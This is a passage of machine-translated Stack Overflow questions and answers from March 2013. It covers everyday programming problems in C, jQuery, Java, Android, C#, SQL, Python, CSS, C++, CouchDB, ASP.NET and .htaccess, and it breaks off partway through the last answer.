> 时间：2013-03-22T04:11:10.313
> 
> 标签：c, scanf

我遇到了一些问题`fscanf`。我对 C 很陌生，但我似乎无法`fscanf`从 .txt 文件中加载正确的信息。

```
int main() {

    //Vars
    FILE *tempFileIn;
    int rowIndex = 0;
    int objectIdNum;
    double magnitudePhotographed;
    double distance;
    int velocity;
    double magnitudeCorrected;
    double magnitudeTotal;

    //Read File Data
    tempFileIn = fopen("hubbleData.txt","r");
    if (tempFileIn == NULL) {
        printf("File read error.");
    }

    printHeaders();
    while(!feof(tempFileIn)) {
        fscanf(tempFileIn, "%lf %lf %lf %lf %lf", &objectIdNum, &distance, &velocity, &magnitudeCorrected, &magnitudeTotal);
        printf( "%2.3f      %2.3f", velocity, distance);
        printf("\n");
        rowIndex++;
    }

    return 0;
} 
```

速度按预期打印，但距离始终打印为 0.0000。如果我切换两者的打印顺序，距离将正确打印，速度将打印为 0.0000。我只关心第二列和第三列，但必须按照项目指南扫描所有列。

```
Input format:
1      0.032    +170      1.5      -16.0
2      0.034    +290      0.5       17.2
6822   0.214    -130      9.0       12.7
598    0.263    -70       7.0       15.1
221    0.275    -185      8.8       13.4
224    0.275    -220      5.0       17.2
5457   0.45     +200      9.9       13.3

Actual Output:                
170.000      0.000
290.000      0.000
-130.000      0.000
-70.000      0.000
-185.000      0.000
-220.000      0.000
 200.000      0.000

Expected Output:
170.000      0.032
290.000      0.034
-130.000      0.214
-70.000      0.263
-185.000      0.275
-220.000      0.275
 200.000      0.45 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:37:17.750

`velocity`被声明`int`但`double`在你的`fscanf()`和`printf()`调用中像 a 一样使用。您可能也打算将其声明为`double`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:21:32.343

编辑：我在用户发布速度和距离类型之前发布了此评论。我假设速度和距离是不兼容的浮点类型，而不是整数。

尝试这个：

```
printf( "%2.3f      %2.3f", (float)velocity, (float)distance); 
```

我的猜测是您将变量传递给 printf 的大小与浮点数不同，因此打印“速度”的第二部分而不是距离。printf 使用栈来传递变量，变量的个数和大小不是由函数定义的，所以任何大小不匹配都会导致这样的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:40:13.757

声明`objectIdNum`and `velocity`as`double`这样`fscanf`并且`printf`将正常工作。

您将变量声明`velocity`为并且在 in和 in 中`int`使用了错误的格式说明符`fscanf``printf`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T04:45:51.273

你需要 3 处改变

1) 声明`velocity`为`double`。

2) in `fscanf`,`objectIdNum`应读作`%d`not `%lf`。

finally`flose(tempFileIn);`在从 main 返回之前使用（退出程序）。

注意：我假设`velocity`因为`double`实际上`velocity`是一个`real`数字而不是一个`integral`值。

# php - 如何使用 jQuery 更改 id 或每个字段

> ID：15562601
> 
> 赞同：-1
> 
> 时间：2013-03-22T04:11:56.377
> 
> 标签：php, jquery, clone

我希望结果必须是这样的，

```
<tr class="tr_cond"> 
<td>BLA</td>
<td>BLA</td>
<td>BLA</td>
<td>BLA</td>
<td><input type="button" class="tr_condition" value="+" name="add"></td>
</tr>
<tr class="tr_cond" id="tablCond1"> 
<td id="tablCond1>BLA</td>
<td id="colCond1>BLA</td>
<td id="operCond1>BLA</td>
<td id="valCond1>BLA</td>
<td><input type="button" class="tr_condition" value="+" name="add"></td>
</tr>
<tr class="tr_cond"> 
<td id="tablCond2>BLA</td>
<td id="colCond2>BLA</td>
<td id="operCond2>BLA</td>
<td id="valCond2>BLA</td>
<td><input type="button" class="tr_condition" value="+" name="add"></td>
</tr>
<tr class="tr_cond"> 
<td id="tablCond3>BLA</td>
<td id="colCond3>BLA</td>
<td id="operlCond3>BLA</td>
<td id="valCond3>BLA</td>
<td><input type="button" class="tr_condition" value="+" name="add"></td>
</tr> 
```

jQuery是，

```
$(".tr_condition").live('click', CloneCondition);
var cloneCount = 1;
function CloneCondition(){
    $(this).closest('.tr_cond')
        .clone()
        .attr('id', 'tablCond'+ cloneCount++)
        .insertAfter(".tr_cond:last"); 
} 
```

正在克隆行，但我想更改行内这些字段的 id，但这只会更改行的 id。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:19:48.067

现在试试这个.....

```
$(".tr_condition").live('click', CloneCondition);
var cloneCount = 1;
function CloneCondition(){

  $("tr td:nth-child(1)").attr("id","your id");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:26:39.357

您要向哪个字段添加`ID`? 到`input`？
与此同时：

**`.on()`**对动态添加到文档的元素**使用该****方法**

[http://jsbin.com/uharaw/5/edit](http://jsbin.com/uharaw/5/edit)

```
$("table").on('click', '.tr_condition', CloneCondition);

var addIDs = ['tabl','col','oper','val'];
var cloneCount = 0;

function CloneCondition(){

    cloneCount++;

    $(this).closest('.tr_cond')
        .clone()
        .insertAfter(".tr_cond:last");

    // after clone is done let's go for the last (new) one
    $('.tr_cond:last td').not(':last').each(function(i){
       $(this).attr('id', addIDs[i] +'Cond'+ cloneCount);
    });

} 
```

单击几下后会导致：

```
<tr class="tr_cond"> 
    <td>BLA</td>
    <td>BLA</td>
    <td>BLA</td>
    <td>BLA</td>
    <td><input name="add" value="+" class="tr_condition" type="button"></td>
</tr>
<tr class="tr_cond"> 
    <td id="tablCond1">BLA</td>
    <td id="colCond1">BLA</td>
    <td id="operCond1">BLA</td>
    <td id="valCond1">BLA</td>
    <td><input name="add" value="+" class="tr_condition" type="button"></td>
</tr>
<tr class="tr_cond"> 
    <td id="tablCond2">BLA</td>
    <td id="colCond2">BLA</td>
    <td id="operCond2">BLA</td>
    <td id="valCond2">BLA</td>
    <td><input name="add" value="+" class="tr_condition" type="button"></td>
</tr> 
```

# java - 仅在需要时创建 Java 对象？

> ID：15562606
> 
> 赞同：0
> 
> 时间：2013-03-22T04:12:45.753
> 
> 标签：java, object, ram

为了节省 RAM，我想在需要时创建类，然后再重用它们。

我的课是这样的：

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class Engine implements ActionListener {

    JFileChooser fileChooser = new JFileChooser();
    Boolean addWindow = false;

    Engine(){}

    //@ void actionPerformed()
    public void actionPerformed(ActionEvent evt){

        if ( evt.getActionCommand().equals("add") ) {
            if ( addWindow = false ) {
                Add Add = new Add();
                Add.setVisible(true);
            }
            else Add.setVisible(true);
        }
    }
} 
```

（只是一类项目）

我认为这只是我自己的一个愚蠢的错误，但我无法弄清楚。

但是如果我尝试编译它会说：

> Engine.java:21：错误：不能从静态上下文引用非静态方法 setVisible(boolean)：否则 Add.setVisible(true); （标记位于 Add 和 setVisible() 之间。）

我不想每次都重新创建 Add 类。如果它已经创建，只需重用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T04:16:12.637

```
Add add = new Add();
if ( addWindow == false ) { //Thanks to @TofuBeer's comment. I didn't notice this at all.         
    add.setVisible(true);
}
else
    add.setVisible(true); 
```

由于您使用的是`Add`（这是 Class 本身的名称），它试图静态调用该方法，这会引发错误，因为它不是您的 class 中的静态方法`Add`。

使用您创建的实例来调用该方法并确保实例名称不完全是类名（类名带有大写字母`A`）。

**添加**- 类名

**add** - 实例名（如果你`Add`也在这里给出，它会考虑类名而不是实例名）。

# android - 如何强制 HttpClient 获取纯 html ？

> ID：15562609
> 
> 赞同：0
> 
> 时间：2013-03-22T04:13:13.797
> 
> 标签：android, httpclient

我正在编写简单的 Android 应用程序，它在特定位置解析 html，获取一些数据并显示在`ListView`. 由于应用程序只需要纯 html 响应，因此有可能只请求纯 html。如何从 http 请求中排除 css 和 java 脚本文件、图像和类似文件？我正在使用 apache`HttpClient`对象。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:16:17.227

这回答了你的问题了吗？如果是这样，请记住在单独的线程上执行此操作以避免 UI 阻塞（可能要使用[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)）

（来自[How to get the html-source of a page from a html link in android?](https://stackoverflow.com/questions/2423498/how-to-get-the-html-source-of-a-page-from-a-html-link-in-android)）

```
HttpClient client = new DefaultHttpClient();
HttpGet request = new HttpGet(url);
HttpResponse response = client.execute(request);

String html = "";
InputStream in = response.getEntity().getContent();
BufferedReader reader = new BufferedReader(new InputStreamReader(in));
StringBuilder str = new StringBuilder();
String line = null;
while((line = reader.readLine()) != null)
{
    str.append(line);
}
in.close();
html = str.toString(); 
```

# c# - Timer 多线程数组共享一个函数的问题

> ID：15562611
> 
> 赞同：0
> 
> 时间：2013-03-22T04:13:18.563
> 
> 标签：c#, multithreading

我有一个多线程计时器数组，每个都调用相同的函数。执行相同的任务，但将不同的值传递给函数。但是由于其他线程同时传入值，价格计算不准确。如何有效地解决这个问题，我有一个想法是传入一个 int ID 来识别不同的计算。

```
 ListOfValue ListOfValue[ListOfValue.ID] = ListOfValue;
   double totalPriceSolve[ListOfValue.ID] = 
          ListOfValue[ListOfValue.ID].priceA + ListOfValue[ListOfValue.ID].PriceB; 
```

但上述解决方案我认为看起来效率不高，将所有数据转换为数组，我不确定是否是线程安全的。

简化 Demo 示例如下计算太短可能看不到问题。

```
System.Threading.Timer[] timerThread = new System.Threading.Timer[10]; 

for(int i=0; i< 10; i++){
    timerThread[i] = new System.Threading.Timer(
                     new TimerCallback(MultiTimerTick2), ListOfValue ,2000, 2000);
}

private void MultiTimerTick2(object obj){
    ListOfValue ListOfValue = (ListOfValue)obj;
    //Perform job like read data from database, after calculation insert into database
    double totalPrice = ListOfValue.priceA + ListOfValue.PriceB;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:59:43.087

您的代码变量似乎是线程安全的，您使用数组并且您不修改它。我可以看到两个问题：

1) 使用 double 进行计算。通常 double 对于财务计算而言并不精确（如 Alexei 所述）。

2）您正在从数据库中读取和写入数据，所以实际上它不安全，因为您不使用锁，所以可能会出现这样的情况：

```
Thread1 read A from DB
Thread2 read A from DB
Thread1 modify A based on read value
Thread1 write A to DB
Thread2 modify A based on read (old) value
Thread2 write A to DB 
```

# mysql - Inner Join with two unions

> ID：15562616
> 
> 赞同：-1
> 
> 时间：2013-03-22T04:13:48.150
> 
> 标签：mysql, sql

Well, I Have four tables and I need to unite those first two and then do a inner join with another union with those other two tables, i'm stuck, thanks anyway

```
SELECT miRNA, Gene_Symbol FROM 
(SELECT cons.miRNA, cons.Gene_Symbol 
FROM conserved_site_context_scores cons
WHERE cons.miRNA = 'hsa-miR-29c'
UNION 
SELECT noncons.miRNA , noncons.Gene_Symbol 
FROM nonconserved_site_context_scores noncons
WHERE noncons.miRNA = 'hsa-miR-29c'
) AS targetScan

SELECT mirna_name, gene_symbol FROM (
SELECT sc.mirna_name, sc.gene_symbol
FROM hg19_predictions_s_c_aug2010 sc
WHERE sc.mirna_name = 'hsa-miR-29c'
UNION
SELECT oc.mirna_name, oc.gene_symbol
FROM hg19_predictions_0_c_aug2010 oc
WHERE oc.mirna_name ='hsa-miR-29c'
) AS microRNA

INNER JOIN microRNA
ON targetScan.miRNA = microRNA.mirna_name
WHERE targetScan.miRNA = 'hsa-miR-29c'; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:19:46.153

I'm guessing you're trying to figure out how to `JOIN` the two `UNION` statements above? If so, give this a try:

```
SELECT miRNA, Gene_Symbol 
FROM 
   (
   SELECT cons.miRNA, cons.Gene_Symbol 
   FROM conserved_site_context_scores cons
   WHERE cons.miRNA = 'hsa-miR-29c'
   UNION 
   SELECT noncons.miRNA , noncons.Gene_Symbol 
   FROM nonconserved_site_context_scores noncons
   WHERE noncons.miRNA = 'hsa-miR-29c'
) AS targetScan INNER JOIN
   (
   SELECT mirna_name, gene_symbol 
   FROM (
      SELECT sc.mirna_name, sc.gene_symbol
      FROM hg19_predictions_s_c_aug2010 sc
      WHERE sc.mirna_name = 'hsa-miR-29c'
      UNION
      SELECT oc.mirna_name, oc.gene_symbol
      FROM hg19_predictions_0_c_aug2010 oc
      WHERE oc.mirna_name ='hsa-miR-29c'
   ) AS microRNA
      ON targetScan.miRNA = microRNA.mirna_name
WHERE targetScan.miRNA = 'hsa-miR-29c'; 
```

I don't think you need the final `WHERE` criteria at the bottom since it's already included in the `UNION`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:23:35.627

Try this:

```
SELECT miRNA, Gene_Symbol
FROM (
       SELECT cons.miRNA, cons.Gene_Symbol
       FROM conserved_site_context_scores cons
       WHERE cons.miRNA = 'hsa-miR-29c'

       UNION

       SELECT noncons.miRNA, noncons.Gene_Symbol
       FROM nonconserved_site_context_scores noncons
       WHERE noncons.miRNA = 'hsa-miR-29c'
    ) AS targetScan
Inner Join
(
   SELECT mirna_name, gene_symbol
   FROM (
    SELECT sc.mirna_name, sc.gene_symbol
    FROM hg19_predictions_s_c_aug2010 sc
    WHERE sc.mirna_name = 'hsa-miR-29c'

    UNION

    SELECT oc.mirna_name, oc.gene_symbol
    FROM hg19_predictions_0_c_aug2010 oc
    WHERE oc.mirna_name = 'hsa-miR-29c'
    )tbl 
)AS microRNA
    ON targetScan.miRNA = microRNA.mirna_name
WHERE targetScan.miRNA = 'hsa-miR-29c'; 
```

# python - Python 2.7 初学者错误：未绑定方法

> ID：15562618
> 
> 赞同：0
> 
> 时间：2013-03-22T04:14:06.567
> 
> 标签：python

我刚开始学习python，最近在学习类时遇到了一个问题。请看一下代码。

```
class Critter(object):
    """your very own bug generator"""
    total=0
    def status(x):
        print Critter.total
        status=staticmethod(status)
    def __init__(self,name):
        print'a critter has been created'
        self.name=name
        Critter.total+=1

crit1=Critter('pooch')
crit2=Critter('Duff')
crit3=Critter('pluto')

Critter.status()
print'\nAccessing the class attributes through an object:',crit1.total 
```

运行代码时出现此错误：

```
line 19, in <module>
Critter.status(Critter.total)
TypeError: unbound method status() must be called with Critter instance as first  
argument(got int instance instead) 
```

我仍然不清楚绑定/未绑定的工作原理。很抱歉初学者的问题，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:17:03.933

您的代码存在以下问题：

*   缩进问题。您定义的任何需要绑定到类（即属于该类）的变量或方法都需要在该类下缩进一级。
*   需要在`status=staticmethod(status)`类下直接定义，不在`status()`方法定义的范围内。由于`status`是指`Critter.status()`
*   至少根据您显示的调用，该`status()`方法不应采用任何参数。`x``Critter.status()`

您看到的上述错误表明 python 无法识别`staticmethod`您的类定义中的调用，因为它的缩进不正确。所以python只是将该`status()`方法定义为一个纯实例方法（这是默认方法）。对于实例方法，python 期望第一个参数是实例句柄。

这应该有效：

```
class Critter(object):
    """your very own bug generator"""
    total=0

    def status():
        print Critter.total
    status=staticmethod(status)

    def __init__(self,name):
        print 'a critter has been created'
        self.name=name
        Critter.total+=1

crit1=Critter('pooch')
crit2=Critter('Duff')
crit3=Critter('pluto')

Critter.status()
print'\nAccessing the class attributes through an object:',crit1.total 
```

**输出：**

```
a critter has been created
a critter has been created
a critter has been created
3

Accessing the class attributes through an object: 3 
```

如果您使用的是 python > 2.4（很可能是这种情况），则可以使用`@staticmethod`装饰器来定义静态方法，如下所示：

```
class Critter(object):
    """your very own bug generator"""
    total=0

    @staticmethod
    def status():
        print Critter.total

    def __init__(self,name):
        print 'a critter has been created'
        self.name=name
        Critter.total+=1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:15:33.043

将您的代码更改为：

```
class Critter(object):
    """your very own bug generator"""

    total = 0

    @staticmethod
    def status():
        print Critter.total

    def __init__(self,name):
        print 'a critter has been created'
        self.name = name
        Critter.total += 1 
```

要查找有关绑定和未绑定方法的更多信息，请尝试阅读[Python 中的类方法差异：绑定、未绑定和静态](https://stackoverflow.com/questions/114214/class-method-differences-in-python-bound-unbound-and-static)

# css - 链接的文本颜色不是黑色

> ID：15562622
> 
> 赞同：1
> 
> 时间：2013-03-22T04:14:33.850
> 
> 标签：css, hyperlink

有人可以帮我编辑这个小提琴。我怎样才能让文字变黑？CSS 编码显示为黑色，但在 Dreamweaver 预览屏幕中显示为浅灰色。

[小提琴](http://jsfiddle.net/raphaelr/8AffQ/)

这是我的 HTML 代码：

```
<div id="class">
    <p><a href="calendar.html">Calendar</a></p>
</div> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T04:18:36.447

您的链接颜色为黑色，只需添加此 CSS。

```
a:hover,a:visited { color:#000; } 
```

您没有看到黑色链接，因为您已经单击了 on 链接，因此浏览器将默认应用访问过的样式。所以在某个地方你需要覆盖这些 CSS 样式声明

**例子**

```
a:link    {color:#000;}  /* unvisited link  */
a:visited {color:#000;}  /* visited link    */
a:hover   {color:#000;}  /* mouse over link */
a:active  {color:#000;}  /* selected link   */ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T04:19:37.373

**习惯了这个**

```
#class a{
color:#000;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T04:25:41.230

或最基本的：

```
<a href="calendar.html"><font color="black">Calendar</font></a> 
```

链接-颜色-文本-/颜色-/链接

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-22T04:18:30.080

我认为您使用的dreamweaver 不兼容良好的颜色。它只是用于素描。相信浏览器中的颜色。

```
#class a:hover {
    font-family: "Brush Script MT";
    font-size: 22px;
    color: #00C; <<<<<<<<<<<<<<<<<<<<<<<<<<<
    font-weight: bold;
    text-decoration: underline;
}
#class a:active {
    font-family: "Brush Script MT";
    font-size: 22px;
    color: #00C; <<<<<<<<<<<<<<<<<<<<<<<<<<<
    font-weight: bold;
    text-decoration: underline;
} 
```

更改颜色代码！！！进入#000

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-22T06:25:15.943

它已经是黑色的，无需添加额外的 CSS 或其他东西。Dreamweaver 预览屏幕中的一些配置问题。

# python - 正则表达式应用引擎

> ID：15562624
> 
> 赞同：0
> 
> 时间：2013-03-22T04:14:50.250
> 
> 标签：python, google-app-engine

我需要检索后面的任何字符串，并在下面的类中`/`检索该字符串。`GetPost`例如：下面的应用程序`/test123`中`/blah`的等应该去上课`GetPost`。

如何在下面的代码中实现上述要求？我需要导入任何模块吗？

```
class GetPost(webapp2.RequestHandler):
    def get(self):
        self.response.write("Permalink")

app = webapp2.WSGIApplication([ 
    ('/', HomePage),
    ('/new-post', NewPost),
    ('/create-post', CreatePost),
    ('/.+', GetPost)
    ], debug=True); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T04:42:33.417

您只需要为您想要的表达式[创建一个捕获组：](https://developers.google.com/appengine/docs/python/tools/webapp/running#URL_Mappings)

```
app = webapp2.WSGIApplication([ 
    ...
    ('/(.+)', GetPost)
    ... 
```

并在您的 get 处理程序中包含一个额外的参数：

```
class GetPost(webapp2.RequestHandler):
    def get(self, captured_thing):
        self.response.write(captured_thing) 
```

这样请求`/xyz`将导致`captured_thing`设置为`'xyz'`.

# iphone - 检测音频是否在 Apple TV 上播放

> ID：15562626
> 
> 赞同：2
> 
> 时间：2013-03-22T04:15:06.577
> 
> 标签：iphone, ios, objective-c, airplay

在我的应用程序中，我可以使用 MPVolumeView 方法启用和禁用 Airplay。如何检测我的应用程序的音频是通过 Apple TV 播放还是通过 iPhone 播放，以便更改 airplay 按钮的颜色？为了使播放动作表出现，我现在这样做。

```
for (UIButton *button in volumeView.subviews)
    {
        if ([button isKindOfClass:[UIButton class]])
        {
            [button sendActionsForControlEvents:UIControlEventTouchUpInside];
        }
    } 
```

我无法知道用户是否按下了 Apple TV 选项或按下了 actionSheet 上的取消。是否有可能知道音频通过的位置，以便我可以相应地更改按钮图像？

# google-maps - 如何从 Places API 获取 Google 地图方向以识别设施？

> ID：15562627
> 
> 赞同：1
> 
> 时间：2013-03-22T04:15:20.250
> 
> 标签：google-maps, google-maps-api-3, google-places-api, google-directions-api

我试图在 Places API 的 2 个“机构”搜索结果之间显示方向，但是将这些位置传递给方向的最佳方法是什么？

当我使用 Places 库并获取搜索结果时，将位置传递给方向的最佳方法似乎是使用 place[0].geometry.location，它给出了结果的经度和纬度。

但是，仅使用该地点的经度和纬度，方向将其地理编码为地址并返回带有近似地址的结果，而我希望它显示来自 Places 的机构名称。

例如，在 Places 返回 SF MOMA 的结果后，我希望路线显示来自“旧金山现代艺术博物馆”之类的路线，而不是“150 3rd Street, San Francisco, CA 94103, USA”，无法描述那个地点。

使用 place[0].name 作为路线的位置也是不准确的。

谢谢！！科迪

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-23T04:31:35.363

place[0].name 为我工作，但您也可以将地址附加到名称：

```
[place[0].name, place[0].vicinity].join(' '); 
```

[示例路线查询](http://maps.googleapis.com/maps/api/directions/json?origin=94131&destination=San%20Francisco%20Museum%20of%20Modern%20Art,%20San%20Francisco&sensor=false)

# c++ - 用于执行控制的c++函数代理

> ID：15562634
> 
> 赞同：1
> 
> 时间：2013-03-22T04:16:00.030
> 
> 标签：c++, templates, boost, bind, functor

我想制作一个“功能代理”：

1.  它是一个函数对象。
2.  它的返回类型和参数类型是从给定的“基本”函数类型作为模板参数自动“继承”的。“基本”函数类型可以是（函数指针/boost::function/boost::bind）之一
3.  它使用给定类型的函数对象进行初始化。
4.  当它被调用时（因为你可以调用原始函数），它能够将调用存储到 boost::bind 之类的东西中，并将其传递到其他地方（有意地，一个线程安全队列，以便可以调用它稍后，在另一个线程中。），然后返回调用的结果。

现在，我的问题是如何（甚至可能）使用模板 teq 创建这个（仿函数）类，并将未知参数列表传递给绑定。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:55:30.217

```
template<typename R, typename... ARGS>
class Proxy {
  typedef std::function<R(ARGS...)> Function;
  Function f;
 public:
  Proxy(Function _f) : f(_f) {}
  R operator(ARGS... args) {
    std::function<R> bound = std::bind(f, args...);
    send_to_worker_thread(bound);
    wait_for_worker_thread();
    return worker_thread_result();
  }
};

// Because we really want type deduction
template<typename R, typename... ARGS>
Proxy<R,ARGS...>* newProxy(R(*x)(ARGS...)) {
  return new Proxy(std::function<R,ARGS...>(x);
} 
```

我还没有实际测试过这个。

你可能想要一些异步的东西，但我会把它留给你。

# ruby - couchrest / open-uri 在 couchdb 视图中为键返回空行

> ID：15562637
> 
> 赞同：0
> 
> 时间：2013-03-22T04:16:16.043
> 
> 标签：ruby, view, couchdb, couchrest

我认为这是沙发的问题，但似乎是更深层次的内部 Ruby 问题。使用以下 couchdb 视图键/值：

```
...
{"key":["Document-2458","MethodID","286"],"value":1},
{"key":["Document-2458","MethodID","287"],"value":1},
{"key":["Document-2458","MethodID","288"],"value":1},
{"key":["Document-2458","MethodID","92"],"value":1},
... 
```

如果我以这种方式要求视图：

```
conn_str = 'http://127.0.0.1:5984/portal_development/_design/all_data_values/_view/view1?group=true'
key = '["Document-2458","MethodID","287"]'
result = JSON.parse(open(conn_str + "&key=" + CGI.escape(key)).read)
puts result 
```

我得到这个结果：

```
{"rows"=>[{"key"=>["Document-2458", "MethodID", "287"], "value"=>1}]} 
```

但如果我这样做：

```
conn_str2 = 'http://127.0.0.1:5984/portal_development/_design/all_data_values/_view/view1?group=true'
key = '["Document-' + "2485" + '","MethodID","287"]'
result = JSON.parse(open(conn_str2 + "&key=" + CGI.escape(key)).read)
puts result 
```

我得到一个空的结果：

```
{"rows"=>[]} 
```

我一生都无法弄清楚为什么......我什至求助于打开wireshark并观察电线上的两个查询。数据包的数据部分中的字节是相同的（带有 url 和参数的东西）。我确认 couchdb 确实在第一个发送给我非空数据，第二个发送给我空数据。Couchdb 甚至在日志中显示相同的查询：

```
[info] [<0.19053.0>] 127.0.0.1 - - 'GET' /portal_development/_design/all_data_values/_view/view1?group=true&key=%5B%22Document-2458%22%2C%22MethodID%22%2C%22287%22%5D 200
[info] [<0.19055.0>] 127.0.0.1 - - 'GET' /portal_development/_design/all_data_values/_view/view1?group=true&key=%5B%22Document-2485%22%2C%22MethodID%22%2C%22287%22%5D 200 
```

问题是每当我连接字符串而不是对其进行硬编码时，即使认为结果字符串是相同的。但我不知道为什么。想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T21:54:49.800

有了第一个关键测试，你就有`Document-2458`了第二个关键测试`"Document-" + "2485"`。

如中，您已在文档 ID 的末尾调换了 8 和 5。

# asp.net - 创建系统管理员 Web 应用程序？

> ID：15562641
> 
> 赞同：0
> 
> 时间：2013-03-22T04:16:33.883
> 
> 标签：asp.net, security, iis

我有一些自定义管理任务要在服务器上执行，但我希望能够通过 Web 服务/应用程序远程管理服务器。要在服务器上运行的任务将需要提升的访问权限。

一个简单的答案是在服务器上以管理员身份运行 ASP.NET 应用程序，这将授予它执行这些管理任务所需的所有权限。但是不强烈推荐以管理员用户身份运行网络应用程序（可以理解）。那么，我有什么选择来提供可以执行管理任务的 Web 应用程序？到目前为止，我的想法是：

1.  ASP.NET 的某种模拟。
2.  以管理员（SYSTEM？）身份在服务器上运行的辅助进程，具有命名管道通信，供 ASP.NET 应用程序插入。

这两种方法的优缺点可能是什么？有没有我没有考虑过的替代方案？在我看来，ASP.NET 模拟可能仍然授予 Web 应用程序太多的权限，但创建辅助进程和维护所有适当的接口是理想情况下可以避免的额外工作。

# windows-phone-7 - 如何使用livedk将内容附加到skydrive中的现有文件

> ID：15562643
> 
> 赞同：1
> 
> 时间：2013-03-22T04:16:34.987
> 
> 标签：windows-phone-7, windows-phone-8, live-sdk

我正在使用以下代码将手机上的内容上传到我的 skydrive 上的文件“SavedContent”。

```
App.liveConnectClient.UploadAsync("me/SkyDrive", "SavedContent" , fileStream, OverwriteOption.Overwrite);

App.liveConnectClient.UploadCompleted += liveConnectClient_UploadCompleted; 
```

如果文件已经存在，我不想覆盖现有文件，而是将新内容附加到上面的文件中。

我看到它的唯一方法是下载文件的内容（如果已经存在），然后附加新内容并使用覆盖选项再次上传文件。我怎样才能使用 livingdk 做到这一点？

# .htaccess - .htaccess 文件 Mod_rewrite - 删除扩展名并删除尾部斜杠

> ID：15562644
> 
> 赞同：0
> 
> 时间：2013-03-22T04:17:01.650
> 
> 标签：.htaccess, mod-rewrite

嘿，我的 .htaccess 文件和删除文件末尾的斜杠时遇到问题。我读到最好有一个URI结构 `http://www.example.com/folder/file`

而不是拥有： `http://www.example.com/folder/file/` 因为显然尾部斜杠将其呈现在目录级别。

所以我快到了，从stackoverflow上的另一个来源得到这个，但它在文档中添加了一个斜线，而不是把它拿走......我似乎无法弄清楚如何把它拿走并用一个重定向任何东西斜杠不是目录，请原谅我，因为我对 .htaccess 文件了解不多。

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}\.php -f
RewriteRule ^([^/]+)/$ $1.php 

# Forces a trailing slash to be added
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_URI} !(\.[a-zA-Z0-9]{1,5}|/)$
RewriteRule (.*)$ /$1/ [R=301,L] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:30:35.470

尝试

```
 RewriteBase /
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)/$ http://%{HTTP_HOST}/$1 
```

# jakarta-ee - 为什么我得到了我的 Singleton EJB 的两个实例？

> ID：15562648
> 
> 赞同：4
> 
> 时间：2013-03-22T04:17:45.810
> 
> 标签：jakarta-ee, java-ee-6

我正在做一些实验来帮助巩固我对@Singleton EJB 的理解。

我已经实现了一个名为 TotalBean 的 EJB，如下所示：

```
@Singleton
public class TotalBean implements TotalBeanLocal {
    @Override
    public String getName() {
        return toString();
    }
} 
```

我将它注入到这样的消息驱动 bean 中：

```
@MessageDriven(mappedName = "jms/TestQueue", activationConfig = {
    @ActivationConfigProperty(propertyName = "acknowledgeMode", propertyValue = "Auto-acknowledge"),
    @ActivationConfigProperty(propertyName = "destinationType", propertyValue = "javax.jms.Queue")
})
public class TotalMessageBean implements MessageListener {

    @EJB
    TotalBeanLocal totalBean;

    @Override
    public void onMessage(Message message) {
        System.out.println("In message-driven bean, totalBean is " + totalBean.getName());
    }
} 
```

并且也变成这样的Servlet：

```
public class TaxTest extends HttpServlet {
    @EJB
    TotalBeanLocal totalBean;

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        System.out.println("In servlet, totalBean is " + totalBean.getName());
        // Display page, etc.
    }
} 
```

EJB 和消息驱动 bean 部署在一个应用程序中，而 servlet 部署在另一个应用程序中。

我的期望是每次使用单例 bean 时，我的 GlassFish 日志都将包含相同的 bean 名称，因为在我的整个域中只会创建一个单例。但是，日志表明我的“单例”bean 至少有两个实例：

*   信息：在 servlet 中，totalBean 是 TotalBean@ **1b8e347**
*   INFO：在消息驱动 bean 中，totalBean 为 TotalBean@1b8e347
*   信息：在 servlet 中，totalBean 为 TotalBean@1b8e347
*   INFO：在消息驱动 bean 中，totalBean 为 TotalBean@ **16ba6b2**
*   信息：在 servlet 中，totalBean 为 TotalBean@1b8e347
*   INFO：在消息驱动 bean 中，totalBean 为 TotalBean@1b8e347
*   信息：在 servlet 中，totalBean 为 TotalBean@1b8e347

任何人都可以帮助我理解我对@Singleton EJB 的理解中的错误吗？

谢谢！

-----斯科特。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-23T16:20:33.463

您是说您有两个应用程序，并且每个应用程序中的单例都不同？

> EJB 和消息驱动 bean 部署在一个应用程序中，而 servlet 部署在另一个应用程序中。

这是根据规范[http://docs.oracle.com/javaee/6/tutorial/doc/gipjg.html](http://docs.oracle.com/javaee/6/tutorial/doc/gipjg.html)：

